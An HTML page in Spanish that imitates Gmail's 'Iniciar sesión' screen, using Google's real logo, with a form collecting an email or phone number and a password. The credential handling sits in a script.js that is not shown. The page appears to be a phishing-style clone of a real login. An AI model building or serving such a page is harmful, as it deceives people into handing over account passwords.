<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Gmail - Iniciar sesión</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="gmail-container">
        <!-- Header con logo de Google/Gmail -->
        <div class="gmail-header">
            <img src="https://www.gstatic.com/images/branding/product/2x/gmail_2020q4_48dp.png" 
                 alt="Gmail" 
                 class="gmail-logo">
            <span class="gmail-title">Gmail</span>
        </div>

        <!-- Tarjeta de inicio de sesión -->
        <div class="gmail-card">
            <h1 class="gmail-card-title">Iniciar sesión</h1>
            <p class="gmail-card-subtitle">Usa tu cuenta de Google</p>

            <!-- Formulario con autocomplete desactivado -->
            <form id="loginForm" autocomplete="off" method="post">
                <div class="gmail-input-group">
                    <input type="text" 
                           id="username" 
                           name="username"
                           class="gmail-input" 
                           placeholder=" " 
                           autocomplete="off"
                           autocorrect="off"
                           autocapitalize="off"
                           spellcheck="false"
                           value=""
                           required>
                    <label for="username" class="gmail-label">Correo electrónico o teléfono</label>
                </div>

                <div class="gmail-input-group">
                    <input type="password" 
                           id="password" 
                           name="password"
                           class="gmail-input" 
                           placeholder=" " 
                           autocomplete="new-password"
                           required>
                    <label for="password" class="gmail-label">Contraseña</label>
                </div>

                <!-- Opciones adicionales -->
                <div class="gmail-checkbox-group">
                    <label class="gmail-checkbox">
                        <input type="checkbox" onclick="togglePassword()">
                        <span>Mostrar contraseña</span>
                    </label>
                    <a href="#" class="gmail-link">¿Olvidaste tu contraseña?</a>
                </div>

                <!-- Botón de submit -->
                <div class="gmail-button-container">
                    <button type="submit" class="gmail-button">Siguiente</button>
                </div>
            </form>

            <!-- Línea divisoria -->
            <div class="gmail-divider">
                <span>o</span>
            </div>

            <!-- Opciones adicionales -->
            <div class="gmail-footer-options">
                <a href="#" class="gmail-link">Crear cuenta</a>
                <a href="#" class="gmail-link">¿Usar otro método?</a>
            </div>
        </div>

        <!-- Footer -->
        <div class="gmail-footer">
            <select class="gmail-language">
                <option>Español (España)</option>
                <option>English (US)</option>
                <option>Português (Brasil)</option>
            </select>
            <div class="gmail-footer-links">
                <a href="#">Ayuda</a>
                <a href="#">Privacidad</a>
                <a href="#">Términos</a>
            </div>
        </div>
    </div>

    <!-- Mensaje oculto para debugging -->
    <div id="message" style="display: none;"></div>

    <script src="script.js"></script>
    <script>
        // Función para mostrar/ocultar contraseña
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
        }
        
        // Limpieza adicional al cargar la página
        window.onload = function() {
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
        };
    </script>
</body>
</html>
